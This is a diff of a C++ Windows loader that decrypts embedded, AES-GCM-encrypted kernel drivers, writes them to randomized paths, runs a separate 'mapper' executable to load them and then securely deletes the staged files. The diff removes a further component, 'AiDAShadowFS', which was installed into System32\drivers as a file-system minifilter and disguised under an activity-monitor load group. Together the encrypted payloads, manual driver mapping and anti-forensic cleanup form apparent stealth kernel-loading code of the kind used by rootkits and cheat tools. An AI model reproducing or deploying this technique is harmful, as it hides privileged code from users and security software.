@@ -2,7 +2,6 @@
 #include "whoswho_encrypted.h"
 #include "sentinel_encrypted.h"
 #include "windmapper_embedded.h"
-#include "shadowfs_encrypted.h"
 #ifdef AIDA_STANDALONE
 #include "helpers/diag_log.hpp"
 #endif
@@ -15,8 +14,6 @@
 #include <ntstatus.h>
 #include <shlobj.h>
 #include <objbase.h>
-#include <winsvc.h>
-#include <fltUser.h>
 #include <cstdarg>
 #include <cstdio>
 #include <cstring>
@@ -29,7 +26,6 @@
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "fltlib.lib")
 
 #ifndef STATUS_AUTH_TAG_MISMATCH
 #define STATUS_AUTH_TAG_MISMATCH ((NTSTATUS)0xC000A002L)
@@ -401,197 +397,6 @@ namespace
         secure_delete(path);
     }
 
-    bool g_shadow_fs_loaded = false;
-    std::wstring s_shadow_fs_service_name;
-    bool s_shadow_fs_started_by_us = false;
-
-    const wchar_t* k_shadowfs_service_name = L"AiDAShadowFS";
-    const wchar_t* k_shadowfs_altitude     = L"385701";
-    const wchar_t* k_shadowfs_instance     = L"AiDAShadowFS Instance";
-
-    bool resolve_drivers_dir(std::wstring& out)
-    {
-        wchar_t windir[MAX_PATH] = {};
-        UINT n = GetWindowsDirectoryW(windir, MAX_PATH);
-        if (n == 0 || n >= MAX_PATH) return false;
-        std::filesystem::path p(windir);
-        p /= L"System32";
-        p /= L"drivers";
-        std::error_code ec;
-        if (!std::filesystem::exists(p, ec)) return false;
-        out = p.wstring();
-        return true;
-    }
-
-    bool decrypt_to_buffer(const unsigned char* ciphertext, unsigned long ciphertext_len,
-                           const unsigned char* key, unsigned long key_len,
-                           const unsigned char* nonce, unsigned long nonce_len,
-                           const unsigned char* tag, unsigned long tag_len,
-                           std::vector<unsigned char>& out)
-    {
-        if (ciphertext_len == 0) return false;
-        out.assign(ciphertext_len, 0);
-        if (!aes_gcm_decrypt(ciphertext, ciphertext_len,
-                             key, key_len,
-                             nonce, nonce_len,
-                             tag, tag_len,
-                             out.data(), static_cast<unsigned long>(out.size()))) {
-            SecureZeroMemory(out.data(), out.size());
-            out.clear();
-            return false;
-        }
-        if (!verify_blob_integrity(out.data(),
-                                    static_cast<unsigned long>(out.size()),
-                                    static_cast<unsigned long>(out.size()))) {
-            SecureZeroMemory(out.data(), out.size());
-            out.clear();
-            set_last_error("Decrypted shadowfs blob failed PE integrity check");
-            return false;
-        }
-        return true;
-    }
-
-    bool write_buffer_to_file(const std::vector<unsigned char>& buf, const std::wstring& path)
-    {
-        HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
-                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (hf == INVALID_HANDLE_VALUE) {
-            set_last_error("CreateFileW failed for shadowfs sys");
-            return false;
-        }
-        DWORD written = 0;
-        BOOL ok = WriteFile(hf, buf.data(), static_cast<DWORD>(buf.size()), &written, nullptr);
-        FlushFileBuffers(hf);
-        CloseHandle(hf);
-        if (!ok || written != static_cast<DWORD>(buf.size())) {
-            set_last_error("WriteFile failed for shadowfs sys");
-            return false;
-        }
-        return true;
-    }
-
-    bool registry_install_minifilter_instance(const wchar_t* service_name,
-                                              const wchar_t* instance_name,
-                                              const wchar_t* altitude_str,
-                                              DWORD flags_value)
-    {
-        if (!service_name || !instance_name || !altitude_str) return false;
-        wchar_t key_path[512];
-        _snwprintf_s(key_path, _countof(key_path), _TRUNCATE,
-                     L"SYSTEM\\CurrentControlSet\\Services\\%s\\Instances",
-                     service_name);
-        HKEY root_key = nullptr;
-        LSTATUS ls = RegCreateKeyExW(HKEY_LOCAL_MACHINE, key_path, 0, nullptr,
-                                     REG_OPTION_NON_VOLATILE,
-                                     KEY_WRITE | KEY_READ, nullptr, &root_key, nullptr);
-        if (ls != ERROR_SUCCESS) {
-            char buf[64];
-            std::snprintf(buf, sizeof(buf), "RegCreateKeyExW(Instances) failed gle=%lu",
-                          static_cast<unsigned long>(ls));
-            set_last_error(buf);
-            return false;
-        }
-        DWORD dummy = 0;
-        RegSetValueExW(root_key, L"DefaultInstance", 0, REG_SZ,
-                       reinterpret_cast<const BYTE*>(instance_name),
-                       static_cast<DWORD>((wcslen(instance_name) + 1) * sizeof(wchar_t)));
-        HKEY inst_key = nullptr;
-        ls = RegCreateKeyExW(root_key, instance_name, 0, nullptr,
-                             REG_OPTION_NON_VOLATILE,
-                             KEY_WRITE | KEY_READ, nullptr, &inst_key, &dummy);
-        RegCloseKey(root_key);
-        if (ls != ERROR_SUCCESS) {
-            char buf[64];
-            std::snprintf(buf, sizeof(buf), "RegCreateKeyExW(Instance) failed gle=%lu",
-                          static_cast<unsigned long>(ls));
-            set_last_error(buf);
-            return false;
-        }
-        RegSetValueExW(inst_key, L"Altitude", 0, REG_SZ,
-                       reinterpret_cast<const BYTE*>(altitude_str),
-                       static_cast<DWORD>((wcslen(altitude_str) + 1) * sizeof(wchar_t)));
-        DWORD flags_dword = flags_value;
-        RegSetValueExW(inst_key, L"Flags", 0, REG_DWORD,
-                       reinterpret_cast<const BYTE*>(&flags_dword), sizeof(flags_dword));
-        RegCloseKey(inst_key);
-        return true;
-    }
-
-    bool ensure_shadowfs_service(const std::wstring& binary_path)
-    {
-        SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
-        if (!scm) {
-            char buf[64];
-            std::snprintf(buf, sizeof(buf), "OpenSCManagerW failed gle=%lu",
-                          static_cast<unsigned long>(GetLastError()));
-            set_last_error(buf);
-            return false;
-        }
-        SC_HANDLE svc = OpenServiceW(scm, k_shadowfs_service_name, SERVICE_ALL_ACCESS);
-        if (!svc) {
-            DWORD gle = GetLastError();
-            if (gle != ERROR_SERVICE_DOES_NOT_EXIST) {
-                CloseServiceHandle(scm);
-                char buf[80];
-                std::snprintf(buf, sizeof(buf), "OpenServiceW(query) failed gle=%lu",
-                              static_cast<unsigned long>(gle));
-                set_last_error(buf);
-                return false;
-            }
-            static const wchar_t k_dependencies[] = L"FltMgr\0";
-            svc = CreateServiceW(
-                scm,
-                k_shadowfs_service_name,
-                k_shadowfs_service_name,
-                SERVICE_ALL_ACCESS,
-                SERVICE_FILE_SYSTEM_DRIVER,
-                SERVICE_DEMAND_START,
-                SERVICE_ERROR_NORMAL,
-                binary_path.c_str(),
-                L"FSFilter Activity Monitor",
-                nullptr,
-                k_dependencies,
-                nullptr, nullptr);
-            if (!svc) {
-                DWORD cgle = GetLastError();
-                CloseServiceHandle(scm);
-                char buf[80];
-                std::snprintf(buf, sizeof(buf), "CreateServiceW(shadowfs) failed gle=%lu",
-                              static_cast<unsigned long>(cgle));
-                set_last_error(buf);
-                return false;
-            }
-        }
-        CloseServiceHandle(svc);
-        CloseServiceHandle(scm);
-
-        if (!registry_install_minifilter_instance(
-                k_shadowfs_service_name,
-                k_shadowfs_instance,
-                k_shadowfs_altitude,
-                0)) {
-            return false;
-        }
-        return true;
-    }
-
-    bool start_shadowfs_filter()
-    {
-        HRESULT hr = ::FilterLoad(k_shadowfs_service_name);
-        if (SUCCEEDED(hr)) {
-            s_shadow_fs_started_by_us = true;
-            return true;
-        }
-        DWORD gle = HRESULT_CODE(hr);
-        if (gle == ERROR_ALREADY_EXISTS || gle == ERROR_SERVICE_ALREADY_RUNNING) {
-            return true;
-        }
-        char buf[96];
-        std::snprintf(buf, sizeof(buf), "FilterLoad(shadowfs) failed hr=0x%08lX gle=%lu",
-                      static_cast<unsigned long>(hr), static_cast<unsigned long>(gle));
-        set_last_error(buf);
-        return false;
-    }
 }
 
 namespace driver_loader
@@ -610,61 +415,6 @@ namespace driver_loader
     const std::string& last_error()
     {
         return s_last_error;
-    }
-
-    bool is_shadow_fs_loaded()
-    {
-        return g_shadow_fs_loaded;
-    }
-
-    bool load_shadow_fs()
-    {
-        if (g_shadow_fs_loaded) return true;
-
-        if (g_shadowfs_ciphertext_len <= 1) {
-            set_last_error("AiDAShadowFS encrypted blob is empty (driver not built yet)");
-            return false;
-        }
-
-        std::vector<unsigned char> shadow_buf;
-        if (!decrypt_to_buffer(g_shadowfs_ciphertext, g_shadowfs_ciphertext_len,
-                               g_shadowfs_key, sizeof(g_shadowfs_key),
-                               g_shadowfs_nonce, sizeof(g_shadowfs_nonce),
-                               g_shadowfs_tag, sizeof(g_shadowfs_tag),
-                               shadow_buf)) {
-            return false;
-        }
-
-        std::wstring drivers_dir;
-        if (!resolve_drivers_dir(drivers_dir)) {
-            set_last_error("Failed to resolve System32\\drivers directory");
-            SecureZeroMemory(shadow_buf.data(), shadow_buf.size());
-            return false;
-        }
-
-        std::wstring binary_path = drivers_dir + L"\\AiDAShadowFS.sys";
-        if (!write_buffer_to_file(shadow_buf, binary_path)) {
-            SecureZeroMemory(shadow_buf.data(), shadow_buf.size());
-            return false;
-        }
-        SecureZeroMemory(shadow_buf.data(), shadow_buf.size());
-
-        if (!ensure_shadowfs_service(binary_path)) {
-            return false;
-        }
-
-        if (!start_shadowfs_filter()) {
-            return false;
-        }
-
-        s_shadow_fs_service_name = k_shadowfs_service_name;
-        g_shadow_fs_loaded = true;
-        return true;
-    }
-
-    void mark_shadow_fs_loaded()
-    {
-        g_shadow_fs_loaded = true;
     }
 
     bool initialize_and_load()
@@ -686,20 +436,14 @@ namespace driver_loader
         std::wstring mapper_path = make_stage_path(stage, L".exe");
         std::wstring whoswho_path = make_stage_path(stage, L".sys");
         std::wstring sentinel_path = make_stage_path(stage, L".sys");
-        std::wstring shadowfs_path;
-        if (g_shadowfs_ciphertext_len > 1) {
-            shadowfs_path = make_stage_path(stage, L".sys");
-        }
-        if (mapper_path.empty() || whoswho_path.empty() || sentinel_path.empty() ||
-            (g_shadowfs_ciphertext_len > 1 && shadowfs_path.empty())) {
+        if (mapper_path.empty() || whoswho_path.empty() || sentinel_path.empty()) {
             set_last_error("Failed to allocate randomized stage paths");
             return false;
         }
-        loader_diag_fmt("stage_paths mapper=\"%s\" whoswho=\"%s\" sentinel=\"%s\" shadowfs=\"%s\"",
+        loader_diag_fmt("stage_paths mapper=\"%s\" whoswho=\"%s\" sentinel=\"%s\"",
             utf8_from_wide(mapper_path).c_str(),
             utf8_from_wide(whoswho_path).c_str(),
-            utf8_from_wide(sentinel_path).c_str(),
-            shadowfs_path.empty() ? "<none>" : utf8_from_wide(shadowfs_path).c_str());
+            utf8_from_wide(sentinel_path).c_str());
 
         if (!decrypt_and_write(g_windmapper_ciphertext, g_windmapper_ciphertext_len,
                                g_windmapper_key, sizeof(g_windmapper_key),
@@ -731,25 +475,8 @@ namespace driver_loader
             return false;
         }
 
-        if (!shadowfs_path.empty()) {
-            if (!decrypt_and_write(g_shadowfs_ciphertext, g_shadowfs_ciphertext_len,
-                                   g_shadowfs_key, sizeof(g_shadowfs_key),
-                                   g_shadowfs_nonce, sizeof(g_shadowfs_nonce),
-                                   g_shadowfs_tag, sizeof(g_shadowfs_tag),
-                                   shadowfs_path, "shadowfs")) {
-                cleanup_stage_file(mapper_path, "windmapper");
-                cleanup_stage_file(whoswho_path, "whoswho");
-                cleanup_stage_file(sentinel_path, "sentinel");
-                cleanup_stage_file(shadowfs_path, "shadowfs");
-                return false;
-            }
-        }
-
         std::wstring cmdline = L"\"" + mapper_path + L"\" \"" +
                                whoswho_path + L"\" \"" + sentinel_path + L"\"";
-        if (!shadowfs_path.empty()) {
-            cmdline += L" \"" + shadowfs_path + L"\"";
-        }
         loader_diag_fmt("mapper_cmdline=\"%s\"", utf8_from_wide(cmdline).c_str());
 
         std::wstring mapper_log_path;
@@ -784,7 +511,6 @@ namespace driver_loader
             cleanup_stage_file(mapper_path, "windmapper");
             cleanup_stage_file(whoswho_path, "whoswho");
             cleanup_stage_file(sentinel_path, "sentinel");
-            cleanup_stage_file(shadowfs_path, "shadowfs");
             set_last_error_fmt("CreateProcessW failed for mapper stage gle=%lu mapper=\"%s\"",
                 static_cast<unsigned long>(gle), utf8_from_wide(mapper_path).c_str());
             return false;
@@ -835,7 +561,6 @@ namespace driver_loader
         cleanup_stage_file(mapper_path, "windmapper");
         cleanup_stage_file(whoswho_path, "whoswho");
         cleanup_stage_file(sentinel_path, "sentinel");
-        cleanup_stage_file(shadowfs_path, "shadowfs");
 
         if (wait_result == WAIT_TIMEOUT) {
             set_last_error_fmt("Mapper stage timed out after 90000 ms log=\"%s\"",
@@ -857,9 +582,6 @@ namespace driver_loader
         }
 
         g_loaded = true;
-        if (!shadowfs_path.empty()) {
-            g_shadow_fs_loaded = true;
-        }
 
         loader_diag("initialize_and_load_success");
         return true;
